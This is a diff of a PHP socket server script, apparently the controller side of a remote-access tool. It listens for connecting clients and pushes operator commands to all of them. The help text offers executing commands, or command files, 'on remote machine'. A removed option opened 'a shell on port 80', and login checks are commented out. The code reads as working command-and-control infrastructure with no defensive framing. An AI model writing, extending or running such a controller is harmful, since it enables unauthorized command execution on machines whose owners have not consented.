@@ -1,12 +1,11 @@
 #!/usr/bin/php -q
 <?php
 
+	error_reporting(0); // suppress warnings
+	
 	set_time_limit(0);
 	ob_implicit_flush(1);
 	define("DELIMITER", "-------------------------------------");
-
-	include_once 'Timer.php';
-	$timer = new Timer();
 
 	$short = "h:p:";
 	$long  = array(
@@ -16,13 +15,13 @@
 	$opts  = getopt($short,$long);
 
 	if(count($opts) < 2){
-		die("Assign remote addr. and port..\n");
+		die("Assign remote ip [-h/--host] and port [-p/--port]\n");
 	}
 
 	/*************************	auth. ****************************/
 	//require_once './serverlogin.php';
 	//if(!calllogin()) die("Login failed");
-	/**********************	end of auth. *************************/
+	/************************* /auth. ****************************/
 
 	
 	$host_addr 	= array_key_exists("host", $opts) ? trim($opts['host']) : trim($opts['h']);
@@ -31,28 +30,31 @@
 
 	if (($master_sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP)) === false)	// create
 	{
-	    echo "\33[91m[!] socket_create() failed: reason: ".socket_strerror(socket_last_error())."\33[0m\n";
+	    die("[\33[91m!\33[0m] socket_create() failed: reason: ".socket_strerror(socket_last_error())."\n");
 	}
 
 
-	// TODO: more options
-	socket_set_option($master_sock, SOL_SOCKET, SO_REUSEADDR, 1);
+	socket_set_option($master_sock, SOL_SOCKET, SO_REUSEADDR, 1);	// options??
 
 
 	if (socket_bind($master_sock, $host_addr, (int)$host_port) === false)	// bind
 	{
-	    echo "\33[91m[!] socket_bind() failed: reason: ".socket_strerror(socket_last_error($master_sock))."\33[0m\n";
+	    die("[\33[91m!\33[0m] socket_bind() failed: reason: ".socket_strerror(socket_last_error($master_sock))."\n");
 	}
+
+
 	if (socket_listen($master_sock) === false)	// listen
 	{
-	    echo "\33[91m[!] socket_listen() failed: reason: ".socket_strerror(socket_last_error($master_sock))."\33[0m\n";
+	    die("[\33[91m!\33[0m] socket_listen() failed: reason: ".socket_strerror(socket_last_error($master_sock))."\n");
 	}
 	
+
 	echo "\33[36mHost [".$host_addr.":".$host_port."] listening for incomming connections..\33[0m\n\n";
 	
-	$clients 		 = array($master_sock);
-	$cstm 	 		 = array();
-	$cnt 			 = 0;
+	$clients = array($master_sock);
+	$cstm 	 = array();
+	$cnt 	 = 0;
+	include_once 'Timer.php';
 
 	while (true) {
 	
@@ -67,6 +69,7 @@
 	    {
 	    	die("\33[91m[!] socket_select() failed: reason: ".socket_strerror(socket_last_error($master_sock))."\33[0m\n");
 	    }
+
 	    if(in_array($master_sock, $recv))
 	    {
 			if (($clients[] = $recv_sock = socket_accept($master_sock)) === false)
@@ -100,16 +103,16 @@
 	            unset($clients[$key]);
 	            unset($recv[$key]);
 	            unset($write[$key]);
-	            unset($cstm[$_key]); 	// u realnom okruzenju - IP umjesto porta
+	            unset($cstm[$_key]); 	// in non-local environment - ip instead of port
 
-	            echo "[".$now."] \33[38;5;208mClient ".$ip.":".$port." disconnected.\33[0m\n";
+	            echo "[".$now."] \33[91mClient ".$ip.":".$port." disconnected.\33[0m\n";
 	            continue;
 	        }
  
           	$data = trim($data);
     
 	        if(!empty($data))
-		    	echo "[".$now."] Client [\33[95m".$ip.":".$port."\33[0m]\n".DELIMITER."\n".$data."\n".DELIMITER."\n";
+		    	echo "[".$now."] Client [\33[36m".$ip.":".$port."\33[0m]\n".DELIMITER."\n".$data."\n".DELIMITER."\n";
 
     	   	// $clients minus master socket
 	    	// $cstm = array of connected clients (ip:port)
@@ -119,7 +122,6 @@
 		    if(count($cstm) == count($clients)-1)
 		    	$line = "";	
 		}
-
 
 		// cnt > 1 => current client off => infinite loop
 		// $line = "exec" until flushed
@@ -164,7 +166,7 @@
 
 				        else if(@socket_write($send_sock, $cmd."\n") === false)
 				        {	
-				        	echo "\33[91mWrite error: ".socket_strerror(socket_last_error($send_sock))."\33[0m\n";
+				        	echo "[\33[91mWrite error\33[0m]: ".socket_strerror(socket_last_error($send_sock))."\n";
 				        }	
 			    	}
 				}
@@ -178,10 +180,11 @@
 			}
 		}
 
-	    switch ($line) {
+	    switch ($line)
+	    {
 
 	    	case 'clients':
-	    		echo "\33[95mClients: ".(count($clients)-1)."\33[0m\n";
+	    		echo "\33[36mClients: ".(count($clients)-1)."\33[0m\n";
 	    		print_r($cstm);
 	    		break;
 
@@ -201,15 +204,16 @@
 
 		if(count($clients) === 1)	// only master socket => no clients
 		{
-			echo "\33[38;5;208mNo connected clients..\33[0m\nListening..\n";
+			echo "[\33[91mNo connected clients\33[0m]: Listening..\n";
 			$line = "";
 		}
+
 		if(!empty($cstm) && !empty($write))
 		{
-		    if(!empty($line) && $line != 'clients'
-		    				 && $line != 'exit'
-		    				 && $line != 'options'
-		    				 && $line != 'shell')	// izbaciti ili doraditi => cheatsheet
+		    if(!empty($line) 
+		    	&& $line != 'clients'
+				&& $line != 'exit'
+				&& $line != 'options')
 		    {
 			  	foreach ($write as $send_sock)
 			  	{
@@ -218,27 +222,23 @@
 
 			        else if(@socket_write($send_sock, $line."\n") === false)
 			        {	
-			        	echo "\33[91mWrite error: ".socket_strerror(socket_last_error($send_sock))."\33[0m\n";
+			        	echo "\33[91m[Write error\33[0m]: ".socket_strerror(socket_last_error($send_sock))."\n";
 			        }	
 			    }
 			}
 		}
-	unset($loop_timer);
+
+		unset($loop_timer);
 	}
 
 	echo "Closing master socket..\n";
-	unset($timer);
 	socket_close($master_sock);
 	exit(0);
 
 
-
-	/*******************************************/
-	/*******************************************/
-	/*******************************************/
-
+	/**********************************************************************************/
 
 	function options(){
-		return "<clients>\t\t\t- display connected clients\n<dc>\t\t\t\t- disconnect all clients\n<exit>\t\t\t\t- exit script\n<shell>\t\t\t\t- opens a shell on port 80\n<exec> <cmd>\t\t\t- execute command\n<exec> <-f> <path>\t\t- execute from file\n";
+		return "<clients>\t\t\t- display connected clients\n<dc>\t\t\t\t- disconnect all clients\n<exit>\t\t\t\t- exit script\n<exec> <cmd>\t\t\t- execute command on remote machine\n<exec> <-f> <path>\t\t- execute commands from file [each cmd 1 line] on remote machine\n";
 	}
 ?>
